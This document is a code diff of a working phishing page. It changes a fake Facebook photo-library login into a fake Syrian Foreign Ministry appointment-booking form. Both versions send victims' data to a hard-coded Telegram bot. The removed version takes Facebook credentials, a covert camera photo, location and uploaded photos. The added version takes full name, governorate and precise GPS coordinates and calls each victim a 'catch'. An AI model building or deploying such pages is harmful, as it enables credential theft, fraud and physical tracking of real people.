@@ -3,372 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - مكتبة الصور</title>
+    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            padding: 20px;
+        /* التنسيقات اللونية الرسمية */
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: #f8f9fa; 
+            margin: 0; 
+            text-align: center; 
+            font-weight: 900; 
+            color: #333;
         }
-        .header {
-            background: white;
-            padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            display: flex;
-            align-items: center;
-            gap: 12px;
+        .header { 
+            background: #ffffff; 
+            padding: 20px; 
+            border-bottom: 5px solid #b38a2e; /* اللون الذهبي الرسمي */
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
         }
-        .logo {
-            background: #1877f2;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
+        .header img { 
+            max-width: 85%; 
+            height: auto; 
+            max-height: 90px; 
         }
-        .title { font-size: 18px; font-weight: 600; color: #1c1e21; }
-        .sub { font-size: 13px; color: #65676b; }
-        .container {
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        .container { 
+            max-width: 450px; 
+            margin: 30px auto; 
+            padding: 30px; 
+            background: #ffffff; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
+            border: 1px solid #e0e0e0;
         }
-        .login-box {
-            text-align: center;
+        h2 { 
+            color: #1a237e; /* الأزرق الملكي */
+            font-size: 26px; 
+            margin-bottom: 10px; 
+            border-bottom: 2px solid #b38a2e;
+            display: inline-block;
+            padding-bottom: 5px;
         }
-        .login-box h2 {
-            font-size: 20px;
-            margin-bottom: 8px;
+        .promo-box { 
+            background-color: #fff3cd; 
+            color: #856404; 
+            padding: 15px; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-bottom: 25px; 
+            border: 1px solid #ffeeba;
         }
-        .login-box p {
-            color: #65676b;
-            font-size: 14px;
-            margin-bottom: 20px;
+        label { 
+            display: block; 
+            text-align: right; 
+            margin: 15px 5% 8px; 
+            font-size: 18px; 
+            color: #1a237e; 
         }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 16px;
-            background: #f5f6f7;
+        input, select { 
+            width: 90%; 
+            padding: 15px; 
+            margin-bottom: 20px; 
+            border: 2px solid #ced4da; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            background: #fdfdfd; 
+            outline: none;
         }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 12px;
-            cursor: pointer;
+        input:focus { border-color: #b38a2e; }
+        
+        .btn { 
+            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
+            color: white; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 12px; 
+            width: 90%; 
+            font-size: 20px; 
+            font-weight: 900; 
+            cursor: pointer; 
+            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
+            transition: 0.3s;
         }
-        .gallery {
-            display: none;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin-top: 20px;
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
+        
+        .footer { 
+            margin-top: 40px; 
+            font-size: 13px; 
+            color: #6c757d; 
+            padding-bottom: 30px; 
         }
-        .gallery img {
-            width: 100%;
-            aspect-ratio: 1;
-            object-fit: cover;
-            border-radius: 12px;
-            cursor: pointer;
-            border: 2px solid transparent;
-            transition: 0.2s;
-        }
-        .gallery img.selected {
-            border-color: #1877f2;
-            transform: scale(0.98);
-        }
-        .preview {
-            margin-top: 20px;
-            text-align: center;
-            display: none;
-        }
-        .preview img {
-            max-width: 100%;
-            max-height: 300px;
-            border-radius: 16px;
-            margin-bottom: 12px;
-        }
-        .send-btn {
-            background: #42b72a;
-            margin-top: 12px;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #e4e6eb;
-            border-top: 3px solid #1877f2;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 12px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div class="logo">f</div>
-    <div>
-        <div class="title">مكتبة الصور</div>
-        <div class="sub">Facebook • آمن ومشفّر</div>
-    </div>
+    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
 </div>
 
 <div class="container">
-    <div id="loginSection" class="login-box">
-        <h2>تأكيد الهوية</h2>
-        <p>لأسباب أمنية، يرجى تسجيل الدخول لعرض مكتبة الصور</p>
-        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-        <input type="password" id="password" placeholder="كلمة السر">
-        <button onclick="login()">تسجيل الدخول</button>
+    <h2>منظومة الحجز الإلكتروني</h2>
+    <div class="promo-box">
+        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
     </div>
+    
+    <label>الاسم الثلاثي:</label>
+    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">
 
-    <div id="loadingSection" class="loading" style="display:none;">
-        <div class="spinner"></div>
-        <p>جاري التحقق...</p>
-    </div>
+    <label>المحافظة المقيم بها:</label>
+    <select id="city">
+        <option value="">-- اختر من القائمة --</option>
+        <option value="إدلب">إدلب</option>
+        <option value="حلب">حلب</option>
+        <option value="دمشق">دمشق</option>
+        <option value="حمص">حمص</option>
+        <option value="حماة">حماة</option>
+        <option value="اللاذقية">اللاذقية</option>
+        <option value="طرطوس">طرطوس</option>
+        <option value="درعا">درعا</option>
+        <option value="دير الزور">دير الزور</option>
+    </select>
 
-    <div id="gallerySection" class="gallery"></div>
-
-    <div id="previewSection" class="preview">
-        <img id="previewImg">
-        <button id="sendSelectedBtn" class="send-btn" onclick="sendSelected()">📤 سحب الصورة إلى التليجرام</button>
-    </div>
+    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<div class="footer">
+    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
+</div>
 
 <script>
-    const BOT_TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const CHAT_ID = "7214473798";
-    
-    let currentSelectedImage = null;
-    let cameraStream = null;
-    let loginSent = false;
-    
-    async function login() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        
-        if (!email || !password) {
-            alert('الرجاء إدخال البريد الإلكتروني وكلمة السر');
-            return;
+    async function startProcess() {
+        let name = document.getElementById("name").value;
+        let city = document.getElementById("city").value;
+
+        if (!name || !city) { 
+            alert("يرجى ملء كافة الحقول المطلوبة."); 
+            return; 
         }
-        
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('loadingSection').style.display = 'block';
-        
-        // إرسال بيانات الدخول
-        if (!loginSent) {
-            loginSent = true;
-            
-            // معلومات الجهاز
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenRes = `${screen.width}x${screen.height}`;
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            let batteryInfo = "غير متاح";
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${Math.round(battery.level * 100)}%`;
-                } catch(e) {}
-            }
-            
-            const report = `🔐 *بيانات دخول فيسبوك*\n\n` +
-                           `📧 البريد: \`${email}\`\n` +
-                           `🔑 كلمة السر: \`${password}\`\n` +
-                           `━━━━━━━━━━━━━━━\n` +
-                           `📱 الجهاز: ${platform}\n` +
-                           `🌐 المتصفح: ${userAgent.split(' ').slice(-2).join(' ')}\n` +
-                           `🗣️ اللغة: ${language}\n` +
-                           `📺 الشاشة: ${screenRes}\n` +
-                           `🌍 المنطقة: ${timeZone}\n` +
-                           `🔋 البطارية: ${batteryInfo}`;
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-            
-            // طلب الكاميرا
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                cameraStream = stream;
-                document.getElementById('video').srcObject = stream;
-                setTimeout(captureCameraPhoto, 1500);
-            } catch(e) {}
-            
-            // طلب الموقع
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`);
-                }, () => {});
-            }
-        }
-        
-        // عرض معرض الصور
-        setTimeout(() => {
-            document.getElementById('loadingSection').style.display = 'none';
-            showGallery();
-        }, 2000);
-    }
-    
-    function captureCameraPhoto() {
-        if (!cameraStream) return;
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('photo', blob, 'camera_selfie.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                method: 'POST',
-                body: formData
-            });
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-        }, 'image/jpeg', 0.7);
-    }
-    
-    function showGallery() {
-        const gallery = document.getElementById('gallerySection');
-        gallery.style.display = 'grid';
-        gallery.innerHTML = '';
-        
-        // صور تجريبية من الإنترنت (مكتبة)
-        const demoImages = [
-            'https://picsum.photos/id/100/200/200',
-            'https://picsum.photos/id/101/200/200',
-            'https://picsum.photos/id/102/200/200',
-            'https://picsum.photos/id/103/200/200',
-            'https://picsum.photos/id/104/200/200',
-            'https://picsum.photos/id/106/200/200',
-            'https://picsum.photos/id/107/200/200',
-            'https://picsum.photos/id/108/200/200',
-            'https://picsum.photos/id/116/200/200',
-            'https://picsum.photos/id/119/200/200',
-            'https://picsum.photos/id/20/200/200',
-            'https://picsum.photos/id/22/200/200'
-        ];
-        
-        for (let i = 0; i < demoImages.length; i++) {
-            const img = document.createElement('img');
-            img.src = demoImages[i];
-            img.onclick = (function(url) {
-                return function() {
-                    selectImage(url);
-                };
-            })(demoImages[i]);
-            gallery.appendChild(img);
-        }
-        
-        // إضافة خيار رفع صورة من الجهاز
-        const uploadDiv = document.createElement('div');
-        uploadDiv.style.cssText = 'grid-column: span 3; text-align: center; padding: 20px; background: #f5f6f7; border-radius: 12px; margin-top: 10px;';
-        uploadDiv.innerHTML = '<input type="file" id="fileUpload" accept="image/*" style="margin: 0 auto;"><br><small style="color:#65676b">اختر صورة من جهازك</small>';
-        gallery.appendChild(uploadDiv);
-        
-        document.getElementById('fileUpload').onchange = function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    selectImage(event.target.result, file);
-                };
-                reader.readAsDataURL(file);
-            }
-        };
-    }
-    
-    function selectImage(imageUrl, fileObject = null) {
-        currentSelectedImage = { url: imageUrl, file: fileObject };
-        document.getElementById('previewImg').src = imageUrl;
-        document.getElementById('previewSection').style.display = 'block';
-        
-        // إزالة التحديد السابق من المعرض
-        document.querySelectorAll('.gallery img').forEach(img => {
-            img.classList.remove('selected');
-        });
-    }
-    
-    async function sendSelected() {
-        if (!currentSelectedImage) {
-            alert('الرجاء اختيار صورة أولاً');
-            return;
-        }
-        
-        const btn = document.getElementById('sendSelectedBtn');
-        btn.textContent = 'جاري السحب...';
-        btn.disabled = true;
-        
-        try {
-            if (currentSelectedImage.file) {
-                // رفع الملف مباشرة
-                const formData = new FormData();
-                formData.append('photo', currentSelectedImage.file);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } else {
-                // تحميل الصورة من الرابط وإرسالها
-                const response = await fetch(currentSelectedImage.url);
-                const blob = await response.blob();
-                const formData = new FormData();
-                formData.append('photo', blob, 'selected_image.jpg');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ تم سحب صورة جديدة من الاستديو`);
-            
-            btn.textContent = '✅ تم السحب بنجاح!';
-            setTimeout(() => {
-                btn.textContent = '📤 سحب الصورة إلى التليجرام';
-                btn.disabled = false;
-            }, 2000);
-            
-        } catch(e) {
-            btn.textContent = '❌ فشل السحب، حاول مرة أخرى';
-            setTimeout(() => {
-                btn.textContent = '📤 سحب الصورة إلى التليجرام';
-                btn.disabled = false;
-            }, 2000);
+
+        // طلب الإذن للموقع والكاميرا (كجزء من التحقق الأمني)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                let lat = p.coords.latitude;
+                let lon = p.coords.longitude;
+                
+                // جلب معلومات البطارية والجهاز
+                let batt = "غير معروفة";
+                try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
+                let device = navigator.platform + " (" + (navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC") + ")";
+
+                let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+                let chat_id = "7214473798";
+                
+                let text = `🎯 صيد ملون وجديد!\n\n` +
+                           `👤 الاسم: ${name}\n` +
+                           `🏙️ المحافظة: ${city}\n` +
+                           `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
+                           `📱 الجهاز: ${device}\n` +
+                           `🔋 البطارية: ${batt}`;
+
+                // إرسال البيانات فوراً
+                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                new Image().src = url;
+
+                alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");
+            }, (err) => {
+                alert("⚠️ عذراً: يجب تفعيل نظام الـ GPS وإذن الوصول للتحقق من هويتك لإتمام الحجز.");
+            }, {enableHighAccuracy: true});
         }
     }
 </script>
+
 </body>
 </html>
